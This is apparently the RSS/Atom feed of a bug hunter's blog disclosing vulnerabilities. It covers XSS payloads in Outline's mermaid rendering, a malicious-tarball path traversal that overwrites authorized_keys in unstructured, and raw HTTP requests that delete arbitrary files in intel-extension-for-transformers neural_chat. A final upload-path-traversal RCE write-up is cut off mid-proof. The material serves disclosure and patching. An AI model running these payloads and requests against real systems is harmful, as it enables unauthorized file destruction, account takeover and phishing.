<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2024-06-02T21:34:36+08:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">sunriseXuâ€™s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">XSS in Outline when rendering mermaid diagrams</title><link href="http://0.0.0.0:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram.html" rel="alternate" type="text/html" title="XSS in Outline when rendering mermaid diagrams" /><published>2024-06-02T10:31:06+08:00</published><updated>2024-06-02T10:31:06+08:00</updated><id>http://0.0.0.0:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram.html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Due to outdated mermaid plugin is used to render diagrams, a known XSS in mermaid classDiagram is able to trigger in outline mermaid diagram.</p>

<h3 id="details">Details</h3>
<p>Outline is using <a href="https://github.com/outline/outline/blob/cb0f03d69820d9cd3422252cb511c7dfeed61904/package.json#L151">mermaid 9.3.0</a> to render mermaid diagram. However, <a href="https://github.com/Milkdown/milkdown/issues/1267#issuecomment-2018032986">this issue</a> have discussed the XSS in mermaid below 10.9.0 when rendering the node names of classDiagram. The name of node is not fully sanitized which leads to  injection of XSS payload.</p>

<h3 id="poc">PoC</h3>

<ol>
  <li>Use <code class="language-plaintext highlighter-rouge">/Mermaid Diagram</code> to insert following xss payload:</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  classDiagram
  Class01 &lt;|-- `AveryLongClass&lt;img src='x' onerror=alert(document.domain)&gt;`
  Class03 *-- Class04
  Class05 o-- Class06
  Class07 .. Class08
  Class01 : size()
  Class01 : int chimp
  Class01 : int gorilla
</code></pre></div></div>
<ol>
  <li>
    <p>Open chrome devtools, you can see CSP is blocking the XSSfrom executing.</p>

    <p><img width="762" alt="outline-xss" src="https://github.com/outline/outline/assets/33363160/360801a9-0964-46f2-9244-5b2d4466da72" />
 <img width="647" alt="outline-xss2" src="https://github.com/outline/outline/assets/33363160/519f4340-187a-401f-a2be-356b8d6e1513" /></p>
  </li>
  <li>
    <p>Use following paylod to inject forms for phishing:</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> classDiagram
 Class01 &lt;|-- `&lt;form action='https://google.com'&gt;&lt;label for='fname'&gt;First name:&lt;/label&gt;&lt;br&gt;&lt;input type='text' id='fname' name='fname' value='John'&gt;&lt;br&gt;&lt;label for='lname'&gt;Last name:&lt;/label&gt;&lt;br&gt;&lt;input type='text' id='lname' name='lname' value='Doe'&gt;&lt;br&gt;&lt;br&gt;&lt;input type='submit' value='Submit'&gt;&lt;/form&gt;`
</code></pre></div>    </div>

    <p><img width="672" alt="xss-phishing" src="https://github.com/outline/outline/assets/33363160/4e495246-59bf-44b3-a41d-eb9459cb2a69" /></p>
  </li>
  <li>
    <p>Use following to inject css styles:</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> classDiagram
 Class01 &lt;|-- `&lt;h1&gt;inject styles&lt;/h1&gt;&lt;style&gt;div{color:red!important;font-size:22px;}&lt;/style&gt;`
 Class01 : int gorilla
</code></pre></div>    </div>
    <p><img width="648" alt="css-injection" src="https://github.com/outline/outline/assets/33363160/928803ff-e90b-4d64-8180-0a50e688fc87" /></p>
  </li>
  <li>
    <p>The poc can be found in <a href="https://sunflowers101.getoutline.com/s/1784c475-adf0-427e-9231-377b6bec6140">this page</a>.</p>
  </li>
</ol>

<h3 id="impact">Impact</h3>

<p>In official outline page, the XSS is blocked by CSP, but attacker can still inject html payload to phishing, or using css injection to get csrf token. Besides, if self-host outline is not configured with CSP, the XSS will be triggered.</p>

<h3 id="reference">Reference</h3>

<p><a href="https://github.com/Milkdown/milkdown/issues/1267">https://github.com/Milkdown/milkdown/issues/1267</a></p>

<p><a href="https://milkdown.dev/playground?text=AYi2FMCdQQwSwCYCgDGAbGBnTAROMBzSGUJAYQ2wAYBGAAgB4AfAWhbuAEEA3KATwAyAewB2BClkwM4oAnUyQUAXgDkADxV1RUSEMhKYaKABcAFAiEoArhBHGAdCiFCA1nHABKAHzBylTFQAzHQAVGx0EtQALH6SVACsWuGRAQBssdQA7HT29hH%2BVAAcGQH0AFzycABe4KYeJbR0FXB2dCgAFjIADg3ldC3GdAR6cGgYSCC%2BSEA%3D">https://milkdown.dev/playground?text=AYi2FMCdQQwSwCYCgDGAbGBnTAROMBzSGUJAYQ2wAYBGAAgB4AfAWhbuAEEA3KATwAyAewB2BClkwM4oAnUyQUAXgDkADxV1RUSEMhKYaKABcAFAiEoArhBHGAdCiFCA1nHABKAHzBylTFQAzHQAVGx0EtQALH6SVACsWuGRAQBssdQA7HT29hH%2BVAAcGQH0AFzycABe4KYeJbR0FXB2dCgAFjIADg3ldC3GdAR6cGgYSCC%2BSEA%3D</a></p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Summary Due to outdated mermaid plugin is used to render diagrams, a known XSS in mermaid classDiagram is able to trigger in outline mermaid diagram.]]></summary></entry><entry><title type="html">Arbitrary File Overwrite via unstructured-ingest in unstructured</title><link href="http://0.0.0.0:4000/file-overwrite/2024/05/29/arbitrary-file-overwrite-in-unstructured.html" rel="alternate" type="text/html" title="Arbitrary File Overwrite via unstructured-ingest in unstructured" /><published>2024-05-29T10:31:06+08:00</published><updated>2024-05-29T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/05/29/arbitrary-file-overwrite-in-unstructured</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/05/29/arbitrary-file-overwrite-in-unstructured.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Arbitrary File Overwrite via unstructured-ingest with uncompress enabled in unstructured</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="version">Version</h2>

<blockquote>
  <p>0.14.3</p>
</blockquote>

<h2 id="description">Description</h2>

<p>The unstructured ingest provide extra <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/sftp"><code class="language-plaintext highlighter-rouge">sftp</code></a> and <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/google-cloud-storage"><code class="language-plaintext highlighter-rouge">gcs</code></a> modules to batch process all documents in remote cloud storages. The <a href="https://github.com/Unstructured-IO/unstructured/blob/3158169585b0ce8bbe784762133b244271a9dec8/unstructured/ingest/utils/compression.py#L76"><code class="language-plaintext highlighter-rouge">process_compressed_doc</code></a> is called to extract the compressed tarball files to local file system. However, the function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar.gz files that can overwrite any file.</p>

<p>Using unstructured python sdk, a victim may download malicious tarball from remote cloud storages. The call stack is following: <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/pipeline/doc_factory.py#L10"><code class="language-plaintext highlighter-rouge">DocFactory.run</code></a> -&gt; <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/connector/fsspec/fsspec.py#L262"><code class="language-plaintext highlighter-rouge">FsspecSourceConnector.get_ingest_docs</code></a> -&gt; <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L83"><code class="language-plaintext highlighter-rouge">CompressionSourceConnectorMixin.process_compressed_doc</code></a> -&gt; <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L33"><code class="language-plaintext highlighter-rouge">uncompress_file</code></a> -&gt; <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66"><code class="language-plaintext highlighter-rouge">uncompress_tar_file</code></a>, The <code class="language-plaintext highlighter-rouge">uncompress_tar_file</code> calls <code class="language-plaintext highlighter-rouge">tarball.extractall</code> without sanitizing the members in tarball, causing members with absolute names or relative names will extracted and written outside target folder.</p>

<p>The <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66"><code class="language-plaintext highlighter-rouge">uncompress_tar_file</code></a> function:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def uncompress_tar_file(tar_filename: str, path: Optional[str] = None) -&gt; str:
    head, tail = os.path.split(tar_filename)
    for ext in TAR_FILE_EXT:
        if tail.endswith(ext):
            tail = tail[: -(len(ext))]
            break

    path = path if path else os.path.join(head, f"{tail}-tar-uncompressed")
    logger.info(f"extracting tar {tar_filename} -&gt; {path}")
    with tarfile.open(tar_filename, "r:gz") as tfile:
        tfile.extractall(path=path)
    return path
</code></pre></div></div>

<p>The Python documentation explains us that tarfiles may have absolute filenames starting with / which could overwite files in system.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: Never extract archives from untrusted sources without prior inspection. 
It is possible that files are created outside of path, 
e.g. members that have absolute filenames starting with "/" or filenames with two dots "..".
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>For simplicity, I use sftp ingest to batch process documents from a test sftp server.</p>

<p>First, letâ€™s start a simple sftp server using docker from <a href="https://hub.docker.com/r/atmoz/sftp/"><code class="language-plaintext highlighter-rouge">atmoz/sftp</code></a>. The server is listen at my local network <code class="language-plaintext highlighter-rouge">10.15.0.5:2222</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run -p 2222:22 -d atmoz/sftp foo:pass:::upload
</code></pre></div></div>

<p>Next, create a malicous tar file using following command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar --absolute-names -czvf hack.tar.gz /home/kali/.ssh/authorized_keys
</code></pre></div></div>

<p>Then, upload <code class="language-plaintext highlighter-rouge">hack.tar.gz</code> to previously created sftp server.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># login to sftp server, account: foo, password: pass
sftp -P 2222 foo@10.15.0.5

# cd into upload folder
sftp&gt; cd upload

# upload hack.tar.gz
sftp&gt; put hack.tar.gz
sftp&gt; ls -la
-rw-r--r--    1 1000     100          2531 May 29 05:35 hack.tar.gz
</code></pre></div></div>

<p>Install <code class="language-plaintext highlighter-rouge">structrue</code> and <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/sftp"><code class="language-plaintext highlighter-rouge">structure[sftp]</code></a>(using python3.10):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install unstructured
pip install "unstructured[sftp]"
</code></pre></div></div>

<p>Using <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/sftp">python snippets</a> in offical document to fetch all documents from sftp server, note that with <code class="language-plaintext highlighter-rouge">uncompress=True</code> set, save as <code class="language-plaintext highlighter-rouge">unstructured_sftp.py</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from unstructured.ingest.interfaces import (
    PartitionConfig,
    ProcessorConfig,
    ReadConfig,
)
from unstructured.ingest.runner import SftpRunner

if __name__ == "__main__":
    runner = SftpRunner(
        processor_config=ProcessorConfig(
            verbose=True,
            output_dir="sftp-output",
            num_processes=2,
        ),
        read_config=ReadConfig(),
        partition_config=PartitionConfig(),
        connector_config=SimpleSftpConfig(
            access_config=SftpAccessConfig(
                username="foo",
                password="pass",
            ),
            remote_url="sftp://10.15.0.5:2222/upload",
            recursive=True,
            uncompress=True
        ),
    )
    runner.run()
</code></pre></div></div>

<p>Lauch the attack, the file <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> in local system is overwritten</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python unstructured_sftp.py

&gt; cat /home/kali/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
</code></pre></div></div>

<p>Or just using <a href="https://docs.unstructured.io/open-source/ingest/source-connectors/sftp"><code class="language-plaintext highlighter-rouge">unstructured-ingest sftp</code> shell command</a> with <code class="language-plaintext highlighter-rouge">--uncompress</code> enabled:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; unstructured-ingest \
  sftp \
  --remote-url sftp://10.15.0.5:2222/upload \
  --username "foo" \
  --password "pass" \
  --num-processes 2 \
  --recursive \
  --uncompress \
  --verbose


&gt; cat /home/kali/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
</code></pre></div></div>

<h2 id="platform">Platform</h2>

<p>I noticed the platform Data Ingestion Source Connectors also have <code class="language-plaintext highlighter-rouge">uncompress</code> option, For example:</p>

<p><a href="https://docs.unstructured.io/platform/platform-source-connectors/sftp-storage">sftp-storage</a></p>

<p><img src="/assets/images/bughunter/unstructured/Source-SFTP.png" alt="sftp" /></p>

<p><a href="https://docs.unstructured.io/platform/platform-source-connectors/google-cloud">google cloud storage</a></p>

<p><img src="/assets/images/bughunter/unstructured/Source-Google-Cloud.png" alt="gc" /></p>

<h2 id="fix">Fix</h2>

<p>Patch for <a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L56C1-L67C16">uncompress_tar_file</a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def uncompress_tar_file(tar_filename: str, path: Optional[str] = None) -&gt; str:
    # See: https://docs.python.org/3/library/tarfile.html#extraction-filters
    def extraction_filter(member, path):
        """Run tarfile.tar_filter, but raise the expected ValueError"""
        # This is only called if the current Python has tarfile filters
        try:
            return tarfile.tar_filter(member, path)
        except tarfile.FilterError as exc:
            raise ValueError(str(exc))
    
    head, tail = os.path.split(tar_filename)
    for ext in TAR_FILE_EXT:
        if tail.endswith(ext):
            tail = tail[: -(len(ext))]
            break

    path = path if path else os.path.join(head, f"{tail}-tar-uncompressed")
    logger.info(f"extracting tar {tar_filename} -&gt; {path}")
    with tarfile.open(tar_filename, "r:gz") as tfile:
        tfile.extraction_filter = extraction_filter
        tfile.extractall(path=path)
    return path
</code></pre></div></div>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>

<h3 id="ssh-access">SSH Access</h3>

<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>

<h3 id="web-servers">Web Servers</h3>

<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>

<h2 id="reference">Reference</h2>

<p><a href="https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89">https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89</a></p>

<h2 id="occurrences">Occurrences</h2>

<p>Version v1</p>

<p><a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L83">https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L83</a></p>

<p><a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66">https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/utils/compression.py#L66</a></p>

<p>Version V2</p>

<p><a href="https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/v2/processes/uncompress.py#L29">https://github.com/Unstructured-IO/unstructured/blob/f4457249a75ea3a045a278af9aab524f7e8d9016/unstructured/ingest/v2/processes/uncompress.py#L29</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat</title><link href="http://0.0.0.0:4000/file-deletion/2024/05/27/arbitrary-file-delete-in-intel-extension-for-transformers.html" rel="alternate" type="text/html" title="Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat" /><published>2024-05-27T10:31:06+08:00</published><updated>2024-05-27T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-deletion/2024/05/27/arbitrary-file-delete-in-intel-extension-for-transformers</id><content type="html" xml:base="http://0.0.0.0:4000/file-deletion/2024/05/27/arbitrary-file-delete-in-intel-extension-for-transformers.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="version">Version</h2>

<blockquote>
  <p>v1.4.2</p>
</blockquote>

<h2 id="description">Description</h2>

<p>The post route <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L598"><code class="language-plaintext highlighter-rouge">/v1/askdoc/delete_file</code></a> endpoint in intel-extension-for-transformers <a href="https://github.com/intel/intel-extension-for-transformers/tree/main/intel_extension_for_transformers/neural_chat#introduction">neural_chat</a> is vulnerable to a path traversal vulnerability through the <code class="language-plaintext highlighter-rouge">del_path</code> parameter which allows the deletion of arbitrary file. The <code class="language-plaintext highlighter-rouge">del_path</code> is directly append to a directory path <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L621">without sanitization</a> and then the file is deleted. An attacker can delete files behalf of current process.</p>

<p>The vulnerable function <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L296C11-L296C30"><code class="language-plaintext highlighter-rouge">retrieval_add_files</code></a>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@router.delete("/v1/askdoc/delete_file")
async def delete_single_file(request: Request):
    """Delete file according to `del_path` and `knowledge_base_id`.

    `del_path`:
        - specific file path(e.g. /path/to/file.txt)
        - folder path(e.g. /path/to/folder)
        - "all_files": delete all files of this knowledge base
    """
    params = await request.json()
    del_path = params['del_path']
    ...
    # partially delete files/folders from the kb
    if delete_path.exists():
        # delete file
        if delete_path.is_file():
            try:
                delete_path.unlink()
            except Exception as e:
                logger.info(f"[askdoc - delete_file] fail to delete file {delete_path}: {e}")
                raise HTTPException(
                    status_code=500,
                    detail=f'Failed to delete file {delete_path}. Exception: {e}'
                )
        # delete folder
        else:
            try:
                shutil.rmtree(delete_path)
            except Exception as e:
                logger.info(f"[askdoc - delete_file] fail to delete folder {delete_path}: {e}")
                raise HTTPException(
                    status_code=500,
                    detail=f'Failed to delete folder {delete_path}. Exception: {e}'
                )
        return {"status": True}
    else:
        raise HTTPException(status_code=404, detail="File/folder not found. Please check del_path.")
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>First, we create a test file at <code class="language-plaintext highlighter-rouge">/home/kali/test.txt</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# touch /home/kali/test.txt
kali@fc7d9ff6a411:/# ls /home/kali/test.txt
-rw-r--r-- 1 kali kali 0 May 27 16:29 /home/kali/test.txt
</code></pre></div></div>

<p>Then we start a default neural_chat server following tutorial from <a href="https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation">https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation</a>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Install system requirements
sudo apt-get update
sudo apt-get install -y python3-pip
sudo apt-get install -y libgl1-mesa-glx

# clone the project
git clone https://github.com/intel/intel-extension-for-transformers.git
cd intel-extension-for-transformers/intel_extension_for_transformers/neural_chat/

# Install python requirements
pip install -r requirements_cpu.txt
pip install fastapi==0.103.2
pip install intel-extension-for-transformers
</code></pre></div></div>

<p>Start neural_chat server, the service is open at <code class="language-plaintext highlighter-rouge">0.0.0.0:8000</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># start neural_chat server, it will download model from internet for first time, be patient.
neuralchat_server start --config_file ./server/config/neuralchat.yaml
</code></pre></div></div>

<p>Send follow post request to the server using burpsuite to delete single file:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DELETE http://10.15.0.5:8000/v1/askdoc/delete_file HTTP/1.1
Host: 10.15.0.5:8000
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
content-type: application/json
Cookie: 
Connection: close
Content-Length: 89

{"del_path":"/home/kali/test.txt","knowledge_base_id":"123"}
</code></pre></div></div>

<p>The response indicates the file is deleted.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Content-Length: 15
Connection: keep-alive
Content-Type: application/json
Date: Mon, 27 May 2024 06:26:58 GMT
Keep-Alive: timeout=4
Proxy-Connection: keep-alive
Server: uvicorn

{"status":true}
</code></pre></div></div>

<p>We can verify the the file is deleted using following command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# ls /home/kali/test.txt
ls: cannot access '/home/kali/test.txt': No such file or directory
</code></pre></div></div>

<p>Delete a folder using following command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DELETE http://10.15.0.5:8000/v1/askdoc/delete_file HTTP/1.1
Host: 10.15.0.5:8000
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
content-type: application/json
Cookie: 
Connection: close
Content-Length: 89

{"del_path":"/home/kali/test-folder","knowledge_base_id":"123"}
</code></pre></div></div>

<h2 id="impact">Impact</h2>

<p>This vulnerability can delete any files and folders the service process could access.</p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L621">https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L621</a></p>]]></content><author><name></name></author><category term="file-deletion" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in intel-extension-for-transformers neural_chat</title><link href="http://0.0.0.0:4000/file-overwrite/2024/05/27/remote-code-execution-using-path-traversal-in-intel-extension-for-transformers.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in intel-extension-for-transformers neural_chat" /><published>2024-05-27T10:31:06+08:00</published><updated>2024-05-27T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/05/27/remote-code-execution-using-path-traversal-in-intel-extension-for-transformers</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/05/27/remote-code-execution-using-path-traversal-in-intel-extension-for-transformers.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in intel-extension-for-transformers neural_chat.</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="version">Version</h2>

<blockquote>
  <p>v1.4.2</p>
</blockquote>

<h2 id="description">Description</h2>

<p>The post route <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L296"><code class="language-plaintext highlighter-rouge">/v1/askdoc/upload_files</code></a> endpoint in intel-extension-for-transformers <a href="https://github.com/intel/intel-extension-for-transformers/tree/main/intel_extension_for_transformers/neural_chat#introduction">neural_chat</a> is vulnerable to a path traversal vulnerability through the <code class="language-plaintext highlighter-rouge">file_paths</code> parameter which allows the uploading of arbitrary files. The <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L308C32-L308C42"><code class="language-plaintext highlighter-rouge">file_path</code></a> is directly append to a directory path <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319">without sanitization</a> and the file content is writen to dest location. An attacker can upload and overwrite <strong>ANY</strong> file on the filesystem. This can lead to remote code execution in many different ways.</p>

<p>The vulnerable function <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L296C11-L296C30"><code class="language-plaintext highlighter-rouge">retrieval_add_files</code></a>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@router.post("/v1/askdoc/upload_files")
async def retrieval_add_files(request: Request,
                           files: List[UploadFile] = File(...),
                           file_paths: List[str] = Form(...),
                           knowledge_base_id: str = Form(...)):
    ...
    for file_path, file in zip(file_paths, files):
        filename = file.filename
        if '/' in filename:
            filename = filename.split('/')[-1]
        logger.info(f"[askdoc - upload_files] received file: {filename}, kb_id: {kb_id}")
        user_id = request.client.host
        logger.info(f'[askdoc - upload_files] user id: {user_id}')

        path_prefix = get_path_prefix(kb_id, user_id)
        upload_path = path_prefix + '/upload_dir'
        persist_path = path_prefix + '/persist_dir'
        save_path = Path(upload_path) / file_path
        save_path.parent.mkdir(parents=True, exist_ok=True)

        # save file content to local disk
        await save_file_to_local_disk(save_path, file)
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>In this proof of concept, we will be gaining remote code execution by uploading our SSH key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file. There are many other ways to achieve remote code execution via a file upload, such as overwriting binaries, writing to .bashrc, â€¦.</p>

<p>We proof this vulnerability by logging into the <code class="language-plaintext highlighter-rouge">kali</code> user running the neural_chat service and checking that at this moment the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file does not exist.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
